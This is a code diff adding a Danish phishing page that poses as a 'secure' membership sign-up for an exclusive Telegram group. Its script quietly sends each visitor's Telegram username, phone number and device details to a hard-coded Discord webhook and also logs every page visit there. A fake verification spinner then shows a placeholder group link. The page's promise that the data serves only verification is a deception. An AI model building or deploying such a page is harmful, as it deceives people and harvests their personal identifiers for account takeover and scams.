@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 Holistisk Gruppe - Bliv Medlem</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0088cc;
+            color: white;
+            line-height: 1.6;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px 20px 30px;
+            background: linear-gradient(135deg, #0088cc, #005580);
+        }
+        
+        .telegram-icon {
+            font-size: 80px;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        .main-content {
+            background: white;
+            color: #333;
+            padding: 30px 20px;
+            min-height: calc(100vh - 200px);
+        }
+        
+        .message-box {
+            background: #f0f8ff;
+            border: 1px solid #0088cc;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .message-title {
+            font-weight: 600;
+            color: #0088cc;
+            margin-bottom: 10px;
+        }
+        
+        .form-section {
+            margin: 25px 0;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f9f9f9;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #0088cc;
+            background: white;
+        }
+        
+        .join-btn {
+            width: 100%;
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        
+        .join-btn:active {
+            background: #005580;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading-screen {
+            display: none;
+            text-align: center;
+            padding: 60px 20px;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 60px 20px;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+        
+        .telegram-btn {
+            display: inline-block;
+            background: #0088cc;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 8px;
+            margin-top: 25px;
+            font-weight: 600;
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            .header {
+                padding: 30px 15px 25px;
+            }
+            
+            .main-content {
+                padding: 25px 15px;
+            }
+            
+            .telegram-icon {
+                font-size: 60px;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="telegram-icon">📱</div>
+        <div class="title">Holistisk Telegram</div>
+        <div class="subtitle">Eksklusiv gruppe - kun for medlemmer</div>
+    </div>
+    
+    <div class="main-content">
+        <div id="form-section">
+            <div class="message-box">
+                <div class="message-title">🔒 Sikker tilmelding</div>
+                <div>
+                    Vi har oprettet en ny, mere sikker Telegram gruppe. 
+                    For at beskytte medlemmerne skal alle verificere sig først.
+                </div>
+            </div>
+            
+            <form id="membershipForm" class="form-section">
+                <div class="input-group">
+                    <label for="username">📱 Dit Telegram brugernavn</label>
+                    <input type="text" id="username" name="username" placeholder="@ditbrugernavn" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="phone">📞 Telefonnummer</label>
+                    <input type="tel" id="phone" name="phone" placeholder="+45 12 34 56 78" required>
+                </div>
+                
+                <button type="submit" class="join-btn">
+                    Bliv medlem nu 🚀
+                </button>
+            </form>
+            
+            <div class="info-text">
+                🔐 Dine oplysninger bruges kun til verifikation<br>
+                ⚡ Du får adgang til gruppen inden for få minutter
+            </div>
+        </div>
+        
+        <div id="loading-section" class="loading-screen">
+            <div class="loading-spinner"></div>
+            <h3>Verificerer dit medlemskab...</h3>
+            <p>Dette tager kun et øjeblik</p>
+        </div>
+        
+        <div id="success-section" class="success-screen">
+            <div class="success-icon">✅</div>
+            <h2>Velkommen til Holistisk!</h2>
+            <p>Din tilmelding er godkendt</p>
+            <a href="https://t.me/+NewGroupLink" class="telegram-btn">
+                📱 Åbn Telegram Gruppe
+            </a>
+        </div>
+    </div>
+    
+    <script>
+        const form = document.getElementById('membershipForm');
+        const formSection = document.getElementById('form-section');
+        const loadingSection = document.getElementById('loading-section');
+        const successSection = document.getElementById('success-section');
+        
+        // Handle form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(form);
+            const data = {
+                username: formData.get('username'),
+                phone: formData.get('phone'),
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                referrer: document.referrer || 'Direct'
+            };
+            
+            // Show loading screen
+            formSection.style.display = 'none';
+            loadingSection.style.display = 'block';
+            
+            // Send data to Discord webhook
+            fetch('https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `📱 **MOBILE HOLISTISK TILMELDING**\n\n👤 **Username:** ${data.username}\n📞 **Phone:** ${data.phone}\n📱 **Platform:** ${data.platform}\n⏰ **Time:** ${data.timestamp}\n🔗 **Referrer:** ${data.referrer}`
+                })
+            }).catch(() => {});
+            
+            // Show success after 2.5 seconds
+            setTimeout(() => {
+                loadingSection.style.display = 'none';
+                successSection.style.display = 'block';
+            }, 2500);
+        });
+        
+        // Track page visits
+        window.addEventListener('load', function() {
+            const visitData = {
+                content: `📱 **MOBILE HOLISTISK BESØG**\n\n⏰ **Time:** ${new Date().toISOString()}\n📱 **Device:** ${navigator.userAgent.substring(0, 60)}...\n🔗 **Referrer:** ${document.referrer || 'Direct'}`
+            };
+            
+            fetch('https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(visitData)
+            }).catch(() => {});
+        });
+    </script>
+</body>
+</html>
